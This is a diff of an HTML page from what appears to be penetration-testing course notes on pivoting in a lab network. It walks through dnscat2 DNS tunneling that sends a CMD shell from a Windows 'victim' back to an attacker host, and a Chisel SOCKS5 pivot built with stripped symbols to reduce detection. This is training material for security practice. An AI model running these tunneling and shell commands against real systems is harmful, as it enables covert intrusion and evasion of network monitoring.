-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="go"> git clone https://github.com/iagox86/dnscat2.git</span>
-</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>
-</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>
-</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a><span class="go">cd dnscat2/server/</span>
-</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a><span class="go">sudo gem install bundler</span>
-</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a><span class="go">sudo bundle install</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="go"> git clone https://github.com/iagox86/dnscat2.git</span>
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>
+</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>
+</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a><span class="go">cd dnscat2/server/</span>
+</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a><span class="go">sudo gem install bundler</span>
+</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a><span class="go">sudo bundle install</span>
 </span></code></pre></div>
 <p><strong>2.</strong> Start the dnscat2 server by executing the dnscat2 file.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="go"> ./dnscat2 --dns server=x.x.x.x,port=53</span>
-</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>
-</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a><span class="go">sudo ruby dnscat2.rb --dns host=$ipAttackerMachine,port=53,domain=inlanefreight.local --no-cache</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="go"> ./dnscat2 --dns server=x.x.x.x,port=53</span>
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="go">sudo ruby dnscat2.rb --dns host=$ipAttackerMachine,port=53,domain=inlanefreight.local --no-cache</span>
 </span></code></pre></div>
 <p>After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="go">New window created: 0</span>
-</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="go">dnscat2&gt; New window created: crypto-debug</span>
-</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="go">Welcome to dnscat2! Some documentation may be out of date.</span>
-</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a>
-</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a><span class="go">auto_attach =&gt; false</span>
-</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a><span class="go">history_size (for new windows) =&gt; 1000</span>
-</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a><span class="go">Security policy changed: All connections must be encrypted</span>
-</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a><span class="go">New window created: dns1</span>
-</span><span id="__span-67-9"><a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a><span class="go">Starting Dnscat2 DNS server on 10.10.14.18:53</span>
-</span><span id="__span-67-10"><a id="__codelineno-67-10" name="__codelineno-67-10" href="#__codelineno-67-10"></a><span class="go">[domains = inlanefreight.local]...</span>
-</span><span id="__span-67-11"><a id="__codelineno-67-11" name="__codelineno-67-11" href="#__codelineno-67-11"></a>
-</span><span id="__span-67-12"><a id="__codelineno-67-12" name="__codelineno-67-12" href="#__codelineno-67-12"></a><span class="go">Assuming you have an authoritative DNS server, you can run</span>
-</span><span id="__span-67-13"><a id="__codelineno-67-13" name="__codelineno-67-13" href="#__codelineno-67-13"></a><span class="go">the client anywhere with the following (--secret is optional):</span>
-</span><span id="__span-67-14"><a id="__codelineno-67-14" name="__codelineno-67-14" href="#__codelineno-67-14"></a>
-</span><span id="__span-67-15"><a id="__codelineno-67-15" name="__codelineno-67-15" href="#__codelineno-67-15"></a><span class="go">  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local</span>
-</span><span id="__span-67-16"><a id="__codelineno-67-16" name="__codelineno-67-16" href="#__codelineno-67-16"></a>
-</span><span id="__span-67-17"><a id="__codelineno-67-17" name="__codelineno-67-17" href="#__codelineno-67-17"></a><span class="go">To talk directly to the server without a domain name, run:</span>
-</span><span id="__span-67-18"><a id="__codelineno-67-18" name="__codelineno-67-18" href="#__codelineno-67-18"></a>
-</span><span id="__span-67-19"><a id="__codelineno-67-19" name="__codelineno-67-19" href="#__codelineno-67-19"></a><span class="go">  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21</span>
-</span><span id="__span-67-20"><a id="__codelineno-67-20" name="__codelineno-67-20" href="#__codelineno-67-20"></a>
-</span><span id="__span-67-21"><a id="__codelineno-67-21" name="__codelineno-67-21" href="#__codelineno-67-21"></a><span class="go">Of course, you have to figure out &lt;server&gt; yourself! Clients</span>
-</span><span id="__span-67-22"><a id="__codelineno-67-22" name="__codelineno-67-22" href="#__codelineno-67-22"></a><span class="go">will connect directly on UDP port 53.</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="go">New window created: 0</span>
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="go">dnscat2&gt; New window created: crypto-debug</span>
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a><span class="go">Welcome to dnscat2! Some documentation may be out of date.</span>
+</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>
+</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a><span class="go">auto_attach =&gt; false</span>
+</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a><span class="go">history_size (for new windows) =&gt; 1000</span>
+</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a><span class="go">Security policy changed: All connections must be encrypted</span>
+</span><span id="__span-68-8"><a id="__codelineno-68-8" name="__codelineno-68-8" href="#__codelineno-68-8"></a><span class="go">New window created: dns1</span>
+</span><span id="__span-68-9"><a id="__codelineno-68-9" name="__codelineno-68-9" href="#__codelineno-68-9"></a><span class="go">Starting Dnscat2 DNS server on 10.10.14.18:53</span>
+</span><span id="__span-68-10"><a id="__codelineno-68-10" name="__codelineno-68-10" href="#__codelineno-68-10"></a><span class="go">[domains = inlanefreight.local]...</span>
+</span><span id="__span-68-11"><a id="__codelineno-68-11" name="__codelineno-68-11" href="#__codelineno-68-11"></a>
+</span><span id="__span-68-12"><a id="__codelineno-68-12" name="__codelineno-68-12" href="#__codelineno-68-12"></a><span class="go">Assuming you have an authoritative DNS server, you can run</span>
+</span><span id="__span-68-13"><a id="__codelineno-68-13" name="__codelineno-68-13" href="#__codelineno-68-13"></a><span class="go">the client anywhere with the following (--secret is optional):</span>
+</span><span id="__span-68-14"><a id="__codelineno-68-14" name="__codelineno-68-14" href="#__codelineno-68-14"></a>
+</span><span id="__span-68-15"><a id="__codelineno-68-15" name="__codelineno-68-15" href="#__codelineno-68-15"></a><span class="go">  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local</span>
+</span><span id="__span-68-16"><a id="__codelineno-68-16" name="__codelineno-68-16" href="#__codelineno-68-16"></a>
+</span><span id="__span-68-17"><a id="__codelineno-68-17" name="__codelineno-68-17" href="#__codelineno-68-17"></a><span class="go">To talk directly to the server without a domain name, run:</span>
+</span><span id="__span-68-18"><a id="__codelineno-68-18" name="__codelineno-68-18" href="#__codelineno-68-18"></a>
+</span><span id="__span-68-19"><a id="__codelineno-68-19" name="__codelineno-68-19" href="#__codelineno-68-19"></a><span class="go">  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21</span>
+</span><span id="__span-68-20"><a id="__codelineno-68-20" name="__codelineno-68-20" href="#__codelineno-68-20"></a>
+</span><span id="__span-68-21"><a id="__codelineno-68-21" name="__codelineno-68-21" href="#__codelineno-68-21"></a><span class="go">Of course, you have to figure out &lt;server&gt; yourself! Clients</span>
+</span><span id="__span-68-22"><a id="__codelineno-68-22" name="__codelineno-68-22" href="#__codelineno-68-22"></a><span class="go">will connect directly on UDP port 53.</span>
 </span></code></pre></div>
 <p><strong>3.</strong> Depending on if we are attacking a windows or a linux machine, we need to use a dnscat2 version for linux or for windows.</p>
 <ul>
@@ -17179,34 +17186,34 @@ Attacked machine 2:
 </ul>
 <p>In this case our attacked machine 1 is a windows machine so we will install dnscat 2 powershell version for clients.</p>
 <p>Installation:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a># In the attacker machine, download the repo:
-</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>git clone https://github.com/lukebaggett/dnscat2-powershell.git
-</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>
-</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a># Then, copy the dnscat2.ps1 file to the windows victim machine. For that use any of the file transfer techniques.
-</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a>
-</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a># Once copied, install it in the windows machine
-</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a>Import-Module .\dnscat2.ps1
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a># In the attacker machine, download the repo:
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>git clone https://github.com/lukebaggett/dnscat2-powershell.git
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>
+</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a># Then, copy the dnscat2.ps1 file to the windows victim machine. For that use any of the file transfer techniques.
+</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a>
+</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a># Once copied, install it in the windows machine
+</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a>Import-Module .\dnscat2.ps1
 </span></code></pre></div>
 <p><strong>4.</strong> After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>Start-Dnscat2 -DNSserver $ipAttackerMachine -Domain domain.local -PreSharedSecret $secret -Exec cmd 
-</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>
-</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a># $secret is obtained from the server launched in the kali machne.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>Start-Dnscat2 -DNSserver $ipAttackerMachine -Domain domain.local -PreSharedSecret $secret -Exec cmd 
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a># $secret is obtained from the server launched in the kali machne.
 </span></code></pre></div>
 <p><strong>5.</strong> In the server launched from the kali machine you will see:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="go">New window created: 1</span>
-</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a><span class="go">Session 1 Security: ENCRYPTED AND VERIFIED!</span>
-</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a><span class="gp gp-VirtualEnv">(the security depends on the strength of your pre-shared secret!)</span>
-</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>
-</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a><span class="go">dnscat2&gt;</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="go">New window created: 1</span>
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="go">Session 1 Security: ENCRYPTED AND VERIFIED!</span>
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a><span class="gp gp-VirtualEnv">(the security depends on the strength of your pre-shared secret!)</span>
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a><span class="go">dnscat2&gt;</span>
 </span></code></pre></div>
 <p><strong>6.</strong> Dnscat2 cheat sheet commands:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a># Listing dnscat2 Options
-</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>?
-</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>
-</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a># Interact with sessions and move further in a target environment on engagements
-</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a>window -i 1
-</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>
-</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a># And you will obtain the shell. But careful, it goes very slow as it is dns 
+<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a># Listing dnscat2 Options
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>?
+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>
+</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a># Interact with sessions and move further in a target environment on engagements
+</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>window -i 1
+</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a>
+</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a># And you will obtain the shell. But careful, it goes very slow as it is dns 
 </span></code></pre></div>
 <h3 id="socks5-tunneling-with-chisel">SOCKS5 Tunneling with Chisel</h3>
 <h4 id="chisel-pivot">Chisel pivot</h4>
@@ -17237,60 +17244,60 @@ Attacked machine 2:
 </tbody>
 </table>
 <p><strong>1.</strong> Install chisel: </p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="gp">#</span><span class="c1">########</span>
-</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
-</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a><span class="gp">#</span><span class="c1">######</span>
-</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a><span class="go">git clone https://github.com/jpillora/chisel.git</span>
-</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>
-</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a><span class="go">cd chisel</span>
-</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a><span class="go">go build</span>
-</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8" href="#__codelineno-72-8"></a>
-</span><span id="__span-72-9"><a id="__codelineno-72-9" name="__codelineno-72-9" href="#__codelineno-72-9"></a>
-</span><span id="__span-72-10"><a id="__codelineno-72-10" name="__codelineno-72-10" href="#__codelineno-72-10"></a><span class="gp"># </span>It<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>helpful<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>mindful<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>size<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>files<span class="w"> </span>we<span class="w"> </span>transfer<span class="w"> </span>onto<span class="w"> </span>targets<span class="w"> </span>on<span class="w"> </span>our<span class="w"> </span>client<span class="err">&#39;</span>s<span class="w"> </span>networks,<span class="w"> </span>not<span class="w"> </span>just<span class="w"> </span><span class="k">for</span><span class="w"> </span>performance<span class="w"> </span>reasons<span class="w"> </span>but<span class="w"> </span>also<span class="w"> </span>considering<span class="w"> </span>detection.
-</span><span id="__span-72-11"><a id="__codelineno-72-11" name="__codelineno-72-11" href="#__codelineno-72-11"></a><span class="gp"># </span>You<span class="w"> </span>can<span class="w"> </span>run<span class="w"> </span><span class="sb">`</span>go<span class="w"> </span>build<span class="w"> </span>-ldflags<span class="o">=</span><span class="s2">&quot;-s -w&quot;</span><span class="sb">`</span><span class="w"> </span>and<span class="w"> </span>reduce<span class="w"> </span>it<span class="w"> </span>to<span class="w"> </span><span class="m">7</span>.5MB<span class="w"> </span><span class="o">(</span>where<span class="w"> </span><span class="sb">`</span>-s<span class="sb">`</span><span class="w"> </span>is<span class="w"> </span>“Omit<span class="w"> </span>all<span class="w"> </span>symbol<span class="w"> </span>information<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>output<span class="w"> </span>file”<span class="w"> </span>or<span class="w"> </span>strip,<span class="w"> </span>and<span class="w"> </span><span class="sb">`</span>-w<span class="sb">`</span><span class="w"> </span>is<span class="w"> </span>“Omit<span class="w"> </span>the<span class="w"> </span>DWARF<span class="w"> </span>symbol<span class="w"> </span>table”<span class="o">)</span>.
-</span><span id="__span-72-12"><a id="__codelineno-72-12" name="__codelineno-72-12" href="#__codelineno-72-12"></a><span class="go">go build -ldflags=&quot;-s -w&quot;</span>
-</span></code></pre></div>
-<p><strong>2.</strong> Once the binary is built, we can use SCP to transfer it to the target pivot host.</p>
 <div class="language-shell-session highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="gp">#</span><span class="c1">########</span>
 </span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
 </span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a><span class="gp">#</span><span class="c1">######</span>
-</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a><span class="go">scp chisel ubuntu@10.10.10.3:~/</span>
+</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a><span class="go">git clone https://github.com/jpillora/chisel.git</span>
 </span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>
-</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a><span class="gp"># </span>And<span class="w"> </span>connect<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>machine
-</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a><span class="go">ssh ubuntu@10.10.10.3</span>
+</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a><span class="go">cd chisel</span>
+</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a><span class="go">go build</span>
+</span><span id="__span-73-8"><a id="__codelineno-73-8" name="__codelineno-73-8" href="#__codelineno-73-8"></a>
+</span><span id="__span-73-9"><a id="__codelineno-73-9" name="__codelineno-73-9" href="#__codelineno-73-9"></a>
+</span><span id="__span-73-10"><a id="__codelineno-73-10" name="__codelineno-73-10" href="#__codelineno-73-10"></a><span class="gp"># </span>It<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>helpful<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>mindful<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>size<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>files<span class="w"> </span>we<span class="w"> </span>transfer<span class="w"> </span>onto<span class="w"> </span>targets<span class="w"> </span>on<span class="w"> </span>our<span class="w"> </span>client<span class="err">&#39;</span>s<span class="w"> </span>networks,<span class="w"> </span>not<span class="w"> </span>just<span class="w"> </span><span class="k">for</span><span class="w"> </span>performance<span class="w"> </span>reasons<span class="w"> </span>but<span class="w"> </span>also<span class="w"> </span>considering<span class="w"> </span>detection.
+</span><span id="__span-73-11"><a id="__codelineno-73-11" name="__codelineno-73-11" href="#__codelineno-73-11"></a><span class="gp"># </span>You<span class="w"> </span>can<span class="w"> </span>run<span class="w"> </span><span class="sb">`</span>go<span class="w"> </span>build<span class="w"> </span>-ldflags<span class="o">=</span><span class="s2">&quot;-s -w&quot;</span><span class="sb">`</span><span class="w"> </span>and<span class="w"> </span>reduce<span class="w"> </span>it<span class="w"> </span>to<span class="w"> </span><span class="m">7</span>.5MB<span class="w"> </span><span class="o">(</span>where<span class="w"> </span><span class="sb">`</span>-s<span class="sb">`</span><span class="w"> </span>is<span class="w"> </span>“Omit<span class="w"> </span>all<span class="w"> </span>symbol<span class="w"> </span>information<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>output<span class="w"> </span>file”<span class="w"> </span>or<span class="w"> </span>strip,<span class="w"> </span>and<span class="w"> </span><span class="sb">`</span>-w<span class="sb">`</span><span class="w"> </span>is<span class="w"> </span>“Omit<span class="w"> </span>the<span class="w"> </span>DWARF<span class="w"> </span>symbol<span class="w"> </span>table”<span class="o">)</span>.
+</span><span id="__span-73-12"><a id="__codelineno-73-12" name="__codelineno-73-12" href="#__codelineno-73-12"></a><span class="go">go build -ldflags=&quot;-s -w&quot;</span>
+</span></code></pre></div>
+<p><strong>2.</strong> Once the binary is built, we can use SCP to transfer it to the target pivot host.</p>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="gp">#</span><span class="c1">########</span>
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
+</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a><span class="gp">#</span><span class="c1">######</span>
+</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a><span class="go">scp chisel ubuntu@10.10.10.3:~/</span>
+</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a>
+</span><span id="__span-74-6"><a id="__codelineno-74-6" name="__codelineno-74-6" href="#__codelineno-74-6"></a><span class="gp"># </span>And<span class="w"> </span>connect<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>machine
+</span><span id="__span-74-7"><a id="__codelineno-74-7" name="__codelineno-74-7" href="#__codelineno-74-7"></a><span class="go">ssh ubuntu@10.10.10.3</span>
 </span></code></pre></div>
 <p><strong>3.</strong> Run the Chisel Server on the Pivot Host, the ubuntu Attacked machine:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="gp">#</span><span class="c1">########</span>
-</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>Ubuntu<span class="w"> </span>compromised<span class="w"> </span>machine,<span class="w"> </span>our<span class="w"> </span>Pivot<span class="w"> </span>Host
-</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a><span class="gp">#</span><span class="c1">######</span>
-</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a>
-</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a><span class="go">./chisel server -v -p 1234 --socks5</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="gp">#</span><span class="c1">########</span>
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>Ubuntu<span class="w"> </span>compromised<span class="w"> </span>machine,<span class="w"> </span>our<span class="w"> </span>Pivot<span class="w"> </span>Host
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a><span class="gp">#</span><span class="c1">######</span>
+</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a>
+</span><span id="__span-75-5"><a id="__codelineno-75-5" name="__codelineno-75-5" href="#__codelineno-75-5"></a><span class="go">./chisel server -v -p 1234 --socks5</span>
 </span></code></pre></div>
 <p>The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.</p>
 <p><strong>4.</strong> Connect to the chisel server</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>#########
-</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a># In the attacker machine
-</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>#######
-</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a>./chisel client -v 10.10.10.3:1234 socks
+<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>#########
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a># In the attacker machine
+</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a>#######
